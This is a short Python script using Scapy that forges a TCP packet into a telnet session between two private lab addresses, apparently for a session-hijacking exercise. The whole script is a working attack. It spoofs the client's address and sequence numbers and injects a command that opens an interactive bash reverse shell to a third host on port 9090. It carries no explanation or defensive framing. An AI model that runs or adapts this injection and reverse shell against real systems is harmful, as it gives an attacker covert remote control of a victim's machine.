#!/usr/bin/python
import sys
from scapy.all import *
print("Sending session hijacking packet ")
IPLayer = IP(src="10.0.2.13" , dst="10.0.2.14")
TCPLayer = TCP(sport=41010, dport=23, flags="A", seq=2940670231, ack=739426834)
Data = "\r /bin/bash -i > /dev/tcp/10.0.2.8/9090 2>&1 0<&1\n"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)

